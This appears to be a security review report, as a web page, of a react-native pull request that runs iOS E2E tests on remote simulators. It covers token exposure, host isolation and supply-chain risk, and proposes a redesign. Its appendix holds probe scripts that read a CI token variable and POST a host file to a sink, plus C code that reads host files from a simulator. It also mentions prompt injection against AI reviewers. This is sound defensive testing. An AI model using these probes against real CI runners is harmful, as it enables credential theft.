@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Running pull requests on remote iOS simulators</title>
+<meta name="description" content="Whether a maintainer comment protects the credentials and machines behind Argent Cloud iOS E2E runs in react/react-native#59135, and a model that doesn&#x27;t depend on review.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Condensed:wght@500;600&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+<link rel="stylesheet" href="../../../assets/report-b1b7feff6a.css">
+</head>
+<body>
+<div class="snapshot-banner"><div>Revision 1 of this report, published 2026-11-04. <a href="../../">Read the latest version</a> · <a href="../../#revisions">All revisions</a></div></div>
+<main class="page">
+  <header>
+    <div class="eyebrow">react/react-native #59135 · safety review</div>
+    <h1>Running pull requests on remote iOS simulators</h1>
+    <p class="lede">Whether a maintainer comment is enough to protect the credentials and machines behind Argent Cloud iOS E2E runs, checked against the PR's workflows and tested against Maestro, the iOS Simulator and the published <code>sim-remote</code> client, with a proposed alternative.</p>
+    <div class="meta">
+      <span>PR head <span class="mono">ebff67b</span></span><span>Maestro 2.6.1</span><span><code>sim-remote</code> 1.0.0</span><span>iOS 27 Simulator, macOS</span><span>Reviewed 2026-11-04</span>
+    </div>
+  </header>
+
+  <section>
+    <h2>Summary</h2>
+    <div class="verdict">
+      <div><span class="k">Verdict</span><span class="v neg">Not safe to land yet</span><span class="d">The on-demand Debug job runs PR code in a job that can mint OIDC tokens. A comment gate doesn't change what runs next to them.</span></div>
+      <div><span class="k">PR binary on the host</span><span class="v neg">Host files readable</span><span class="d">A simulator binary ran as the host macOS user and read and wrote host files. Argent's isolation between leases isn't documented.</span></div>
+      <div><span class="k">Maestro flows</span><span class="v neg">Not inert</span><span class="d">Flow JavaScript read a file from the host and POSTed it to a server. The rest of the sandbox held.</span></div>
+      <div><span class="k">PR volume</span><span class="v">299 in 7 days</span><span class="d">PR branches with a Test All run, and 89% of runs came from forks. A maintainer can't vouch for every one by comment.</span></div>
+    </div>
+    <div class="prose stack">
+      <p><a href="https://github.com/react/react-native/pull/59135">react/react-native#59135</a> by Juliusz Wajgelt (<a href="https://github.com/jwajgelt">@jwajgelt</a>) moves iOS Maestro E2E from <code>macos-26-large</code> runners to <code>ubuntu-latest</code> driving Argent Cloud remote simulators, with run times of about 35 minutes against 71–102 minutes. That speedup is worth having. Fork PRs get no OIDC token, so the PR moves their runs behind a maintainer comment, <code>@react-native-bot e2e-tests</code>. Nicola Corti (<a href="https://github.com/cortinico">@cortinico</a>) asked whether an agentic review could suggest that command.</p>
+      <p>The better fix is architectural: keep PR code out of any job that can mint a token, treat the fleet host as the place hostile code runs, and then run automatically. Neither a trusted build artefact nor AI review can replace that. Both can help once a bad decision can only waste machine time.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>What's at risk</h2>
+    <div class="prose"><p>The risks below are ranked by what a malicious PR can reach. None of them is live: the PR hasn't landed, and nothing here was tried against Argent's fleet.</p></div>
+    <div class="tradeoffs">
+      <div class="tradeoff"><span class="sev high">Token theft</span><div><span class="t">The on-demand Debug template app job runs PR code with <code>id-token: write</code></span><span class="b"><code>init-project-e2e.js</code> installs the PR's <code>react-native-package</code>, then <code>maestro-ios</code> runs <code>yarn start</code> from it. PR code can request tokens for any audience, identified as <code>e2e-ios-on-demand.yml</code> on <code>main</code>. That gives it the Argent login, and anything else that trusts that workflow. Fix: Run Release only on this path until Metro runs outside the token's job.</span></div></div>
+      <div class="tradeoff"><span class="sev high">Unknown</span><div><span class="t">Nothing establishes what a PR-built <code>.app</code> can do to the fleet host</span><span class="b">The PR-built app is native code on Argent's Mac, and the Simulator isn't a virtual machine. Argent's README doesn't describe isolation between leases. Text in the published client says release erases the simulators, which doesn't describe the host, and <code>spawn</code> can upload a binary and leave it running. Isolation may well exist, so this is a question for Argent. It decides whether fork PRs can run at all.</span></div></div>
+      <div class="tradeoff"><span class="sev high">Supply chain</span><div><span class="t">Third-party code floats in the token's job</span><span class="b"><code>argent-cloud-actions/*@v2</code> is a moving tag, and <code>install</code> always fetches the latest <code>sim-remote</code>, with no version input or checksum. A compromise of either repository reaches every run's token. Fix: Pin actions to SHAs, as the repository's other trusted workflows do, and restore a version and checksum in <code>install</code>.</span></div></div>
+      <div class="tradeoff"><span class="sev med">File read</span><div><span class="t">PR-supplied flows can read runner files and send them anywhere</span><span class="b">See the test results below. The direct route to the OIDC request token failed, but only because of an HTTP client length check. Fix: Run flows outside the token's job.</span></div></div>
+      <div class="tradeoff"><span class="sev med">Coverage loss</span><div><span class="t">Fork PRs lose automatic iOS E2E, and the hint meant to replace it doesn't reach them</span><span class="b">Fork PRs were 704 of 789 Test All PR runs. <code>e2e-ios-suggest.yml</code> finds the PR through <code>commits/&lt;sha&gt;/pulls</code>, which returned an empty list for a fork's head on react/react-native#59551, so its hint is skipped there.</span></div></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>What the tests showed</h2>
+    <div class="prose"><p>Each row is one direct test, using canary files and a local HTTP server. The Maestro row ran <code>GraalJsEngine</code> from Maestro 2.6.1's shipped jars, which is the engine behind <code>runScript</code> and <code>evalScript</code>.</p></div>
+    <div class="scroll"><table>
+      <thead><tr><th>Test</th><th class="l">Result</th><th class="l">What it means</th></tr></thead>
+      <tbody>
+        <tr class="group"><td colspan="3">iOS Simulator</td></tr>
+        <tr><td class="sans">Simulator binary reads a host file</td><td class="l neg">Read a canary and a file in the home directory</td><td class="l">The Simulator gives no filesystem boundary to a process started with <code>simctl spawn</code>.</td></tr>
+        <tr><td class="sans">Simulator binary writes a host file</td><td class="l neg">Wrote a file under <code>/tmp</code></td><td class="l">A session can leave things behind unless the host is reset.</td></tr>
+        <tr><td class="sans">Installed app's process</td><td class="l neg">Plain host process, same user</td><td class="l">Seen in <code>ps</code>. Host file access wasn't tested from inside an installed app.</td></tr>
+        <tr class="group"><td colspan="3">Maestro flow JavaScript</td></tr>
+        <tr><td class="sans"><code>Java</code>, <code>Packages</code>, <code>Polyglot</code></td><td class="l pos">Undefined</td><td class="l">No route to host classes.</td></tr>
+        <tr><td class="sans"><code>process</code>, <code>require</code>, <code>load</code></td><td class="l pos">Blocked</td><td class="l"><code>load</code> fails with "Operation is not allowed".</td></tr>
+        <tr><td class="sans">Environment variables</td><td class="l pos">Not visible</td><td class="l">An OIDC token variable set on the process didn't reach JavaScript.</td></tr>
+        <tr><td class="sans"><code>http.post</code> with <code>multipartForm.filePath</code></td><td class="l neg">Sent the host file to the server</td><td class="l">Any regular file the process can read can leave the runner.</td></tr>
+        <tr class="group"><td colspan="3">OkHttp 4.12.0 on Linux, as Maestro ships it</td></tr>
+        <tr><td class="sans"><code>/etc/hostname</code></td><td class="l neg">Sent, HTTP 200</td><td class="l">The Linux path behaves the same as macOS.</td></tr>
+        <tr><td class="sans"><code>/proc/self/environ</code></td><td class="l pos">Failed: <code>expected 193 bytes but received 896</code></td><td class="l">The file reports length 0, so the client refuses the mismatch. This protects the token by accident. It isn't a boundary to rely on.</td></tr>
+      </tbody>
+    </table></div>
+    <p class="note prose">The simulator tests ran on a local iOS 27 simulator, not Argent's fleet. On a hosted runner, <code>actions/checkout</code> persists <code>GITHUB_TOKEN</code> in a credentials file by default, so it should be readable the same way. That's inferred and wasn't run, and that token only has <code>contents: read</code> and <code>actions: read</code> here.</p>
+  </section>
+
+  <section>
+    <h2>Why a trusted artefact doesn't solve this</h2>
+    <div class="prose stack">
+      <p>A clean build gives provenance, not safety. An attestation can prove which commit and recipe produced the bytes, but a PR's <code>.app</code> is still the PR's native code, however faithfully it was built. The build also executes PR-controlled scripts, such as podspecs, Gradle files and codegen.</p>
+      <p>Meaningful provenance also has a cost. A <code>pull_request</code> run uses the PR's own workflow files, so the builder has to be defined from the base branch, through <code>pull_request_target</code> or <code>workflow_run</code>. Those run in the default branch's cache scope, where PR code running in the job can poison caches that later <code>main</code> runs restore. <code>pull_request</code> builds have no OIDC token, a read-only token and an isolated cache.</p>
+      <p>The artefact isn't the gap. Keep builds on <code>pull_request</code>, treat their output as hostile, and control where it runs. Attestation can come later for attribution: if a malicious run happens, it shows which commit produced it.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Why AI review can't be the gate</h2>
+    <div class="prose stack">
+      <p>An AI reviewer reads attacker-controlled text, so prompt injection is part of its threat model. It also can't evaluate a compiled binary, or what a build script does at run time. A false negative hands over the token. The repository's own AI review workflow makes the same point about its <code>/review</code> command: "gate controls who triggers, not what code runs".</p>
+      <p>It's still useful for scheduling. It can suggest which PRs deserve a run and flag sensitive paths for a human. Reviewing fork PRs needs a model key in a base-context job, so that job needs no tools, and its output should be an allowlisted value. The existing <code>should_test_ios</code> path filter is deterministic and already skips iOS on 167 of the PR runs measured, so it's the first thing to try, with AI added only if that proves too blunt.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>A model that doesn't depend on review</h2>
+    <div class="prose"><p>The job is the boundary, not the step. <code>ACTIONS_ID_TOKEN_REQUEST_*</code> is in the environment of every step, and later steps in a job share a user with passwordless <code>sudo</code> on GitHub-hosted runners. So PR code and the token have to live in different places.</p></div>
+    <div class="scroll"><table>
+      <thead><tr><th>Zone</th><th class="l">Trigger</th><th class="l">Holds</th><th class="l">Runs</th></tr></thead>
+      <tbody>
+        <tr><td class="sans">Build (hostile)</td><td class="l"><code>pull_request</code></td><td class="l">Nothing</td><td class="l">Builds the app and JS bundle, collects flows, as it does today</td></tr>
+        <tr><td class="sans">Broker (trusted)</td><td class="l"><code>workflow_run</code> from <code>main</code></td><td class="l">OIDC token</td><td class="l"><code>main</code> code and pinned actions, with PR output handled as data</td></tr>
+        <tr><td class="sans">Execute (hostile)</td><td class="l">Started by the broker</td><td class="l">One lease</td><td class="l">App, Maestro, flows, Metro, with damage bounded by the lease</td></tr>
+      </tbody>
+    </table></div>
+    <div class="grid2">
+      <div class="prose stack">
+        <h3>Option A: hosted test run (recommended)</h3>
+        <p>The broker uploads the app and flows, and Maestro runs on the leased machine. The runner only polls and downloads results. The previous Maestro Cloud setup took this shape. It needs a submit-and-poll API from Argent, and the client's <code>sim-remote build</code> looks like a similar shape. Start with Release, since Debug also needs Metro on the fleet.</p>
+      </div>
+      <div class="prose stack">
+        <h3>Option B: container on the runner</h3>
+        <p>The broker acquires a machine on the host, then runs Maestro, flows and Metro in a locked-down container with only the client's daemon socket mounted. That needs no Argent changes and keeps the token, runner files and <code>sudo</code> out of reach. It's a design only: whether the socket and Maestro shims work across the boundary is untested.</p>
+      </div>
+    </div>
+    <div class="prose"><p>Both options need the same things from Argent: a host reimage or virtual machine per lease, or at the very least per tenant, with no shared credentials on hosts. They also need leases limited to one machine with a short lifetime, plus an OIDC audience bound to Argent's router, which couldn't be determined from the client.</p></div>
+    <div style="display:grid;gap:10px">
+      <h3>When runs happen</h3>
+      <div class="scroll"><table>
+        <thead><tr><th>Case</th><th class="l">Policy</th><th class="l">Why</th></tr></thead>
+        <tbody>
+          <tr><td class="sans"><code>main</code>, <code>-stable</code>, manual</td><td class="l">Always</td><td class="l">Trusted, as in the PR.</td></tr>
+          <tr><td class="sans">PR where Test All ran and iOS is affected</td><td class="l">Release, automatically</td><td class="l">GitHub's "approve and run" already gates first-time contributors, with 54 runs held for approval since 2026-10-22.</td></tr>
+          <tr><td class="sans">PR by an <code>OWNER</code> or <code>MEMBER</code></td><td class="l">Same, as an interim step before A or B</td><td class="l">Any member can already comment the trigger, so this adds no trust beyond the PR's gate. Needs the Debug job off the token path, and the host isolation answer still applies.</td></tr>
+          <tr><td class="sans">Budget</td><td class="l">One automatic run per head SHA, with per-PR and per-day caps</td><td class="l">What's left to protect is machine time.</td></tr>
+          <tr><td class="sans">Maintainer comment</td><td class="l">Manual override, naming a SHA</td><td class="l">The SHA closes the gap between review and run. Check write permission through the API.</td></tr>
+          <tr><td class="sans">Debug with Metro</td><td class="l"><code>main</code> and macOS PR runners only, for now</td><td class="l">Those PR runners hold no credentials, so this loses nothing while Release moves first.</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Other findings in the PR</h2>
+    <div class="scroll"><table>
+      <thead><tr><th>Where</th><th class="l">Problem</th><th class="l">Fix</th></tr></thead>
+      <tbody>
+        <tr><td>test-all.yml:13</td><td class="l"><code>id-token: write</code> at workflow level reaches every Test All job. The two E2E workflows do the same.</td><td class="l">Grant it only on the job that acquires a machine.</td></tr>
+        <tr><td>e2e-ios-on-demand.yml:18</td><td class="l">The concurrency group ignores <code>author_association</code>, so anyone commenting the trigger phrase can cancel a maintainer's run.</td><td class="l">Include the check in the group expression.</td></tr>
+        <tr><td>e2e-ios-on-demand.yml:26</td><td class="l"><code>COLLABORATOR</code> includes read and triage access.</td><td class="l">Check the permission level through the API.</td></tr>
+        <tr><td>e2e-ios-on-demand.yml:44</td><td class="l">The head SHA resolves when the comment arrives, so a push after review is what runs.</td><td class="l">Require the SHA in the comment.</td></tr>
+        <tr><td>e2e-ios-on-demand.yml</td><td class="l">One attempt, with <code>fail-on-error: true</code>, where <code>main</code> gets three.</td><td class="l">Retry, using the <code>retryable</code> output now on <code>main</code>.</td></tr>
+        <tr><td>e2e-ios-rntester.yml:44</td><td class="l">RNTester Debug checks out the default branch, so it serves <code>main</code>'s JS to the PR's native build.</td><td class="l">Follows from running Release only.</td></tr>
+        <tr><td>e2e-ios-rntester.yml:99</td><td class="l"><code>needs.test.outputs.status</code> expands inside <code>run:</code>, in a job with <code>id-token: write</code>.</td><td class="l">Pass it through <code>env:</code>.</td></tr>
+        <tr><td class="sans">PR description</td><td class="l">Says iPhone 18 Pro and iOS 27, while the workflow has iPhone 17 Pro and iOS 26.2. It doesn't describe the on-demand path. The test run predates that path, and <code>issue_comment</code> workflows only run from the default branch.</td><td class="l">Update the description, and test the on-demand path from a fork of a copy.</td></tr>
+        <tr><td class="sans">Merge state</td><td class="l">Conflicts with <code>main</code>, 88 commits behind at review. Maestro Cloud has since been removed there.</td><td class="l">Rebase.</td></tr>
+      </tbody>
+    </table></div>
+    <p class="note prose">Line numbers are at <span class="mono">ebff67b</span>, in <code>.github/workflows/</code>.</p>
+  </section>
+
+  <section>
+    <h2>Recommendation</h2>
+    <div class="prose">
+      <ul class="tight">
+        <li><strong>Don't land the on-demand Debug path.</strong> Run Release only on PRs until Metro runs outside the token's job.</li>
+        <li><strong>Pin the Argent actions and client</strong>, and narrow <code>id-token: write</code> to the one job that needs it.</li>
+        <li><strong>Ask Argent about host isolation first.</strong> The answer decides whether fork PR binaries can run there at all.</li>
+        <li><strong>Build the broker and execute split</strong>, with a hosted test run as the target and the container as the fallback.</li>
+        <li><strong>Then run automatically</strong> on PRs where Test All ran, with budgets. Add AI only as a scheduling hint, if the path filter proves too blunt.</li>
+      </ul>
+    </div>
+  </section>
+
+  <section>
+    <h2>Method</h2>
+    <div class="prose stack">
+      <p>The workflow findings come from reading the PR at <span class="mono">ebff67b</span>. Nothing from the PR was executed. The fork lookup was checked with one API call on react/react-native#59551. Volumes come from the Actions API for Test All runs from 2026-10-22 16:28 UTC to 2026-10-29 15:45 UTC, counting 789 PR runs on 299 distinct head branches, 704 of them from forks. Branch names are an approximation of PRs. The 167 path-filtered runs come from the same data across pre-pause PR runs.</p>
+      <p>Statements about Argent come from its public actions repository and README, and from text in the published <code>sim-remote</code> 1.0.0 macOS binary, read with <code>strings</code> and not executed. That makes them weaker evidence than the rest. Argent's servers and hosts weren't contacted or tested. Maestro's file read is a documented form of its HTTP API, not a bypass.</p>
+      <p>Not verified: file paths on a real GitHub-hosted runner, host access from inside an installed app, and either option in the proposed model.</p>
+    </div>
+    <details class="prose">
+      <summary>Maestro engine probe</summary>
+<pre>// probe.js, evaluated by maestro.js.GraalJsEngine with SINK and CANARY in env.
+const out = {};
+function t(name, fn) { try { out[name] = String(fn()); } catch (e) { out[name] = 'BLOCKED: ' + e; } }
+t('Java.type', () =&gt; Java.type('java.lang.System').getenv('PATH'));
+t('Polyglot', () =&gt; Polyglot.eval('js', '1+1'));
+t('process.env', () =&gt; process.env.PATH);
+t('require', () =&gt; require('fs'));
+t('Packages', () =&gt; Packages.java.lang.System.getenv('PATH'));
+t('load', () =&gt; load('/etc/hosts'));
+t('secret env', () =&gt; ACTIONS_ID_TOKEN_REQUEST_TOKEN);
+t('file read + POST', () =&gt; http.post(SINK + '/file', {
+  multipartForm: {f: {filePath: CANARY, mediaType: 'text/plain'}},
+}).status);
+http.post(SINK + '/result', {body: JSON.stringify(out)});</pre>
+    </details>
+    <details class="prose">
+      <summary>Simulator host access probe</summary>
+<pre>// xcrun -sdk iphonesimulator clang -arch arm64 -mios-simulator-version-min=18.0 readhost.c -o readhost
+// xcrun simctl spawn &lt;udid&gt; "$PWD/readhost"
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main(void) {
+  char b[128] = {0};
+  FILE *f = fopen("/tmp/host-canary.txt", "r");
+  if (!f) { perror("canary"); return 1; }
+  fgets(b, 127, f);
+  printf("read host file: %s", b);
+  f = fopen("/tmp/sim-wrote.txt", "w");
+  if (f) { fputs("x", f); fclose(f); printf("wrote host file\n"); }
+  printf("uid=%d\n", getuid());
+  return 0;
+}</pre>
+    </details>
+  </section>
+</main>
+</body>
+</html>
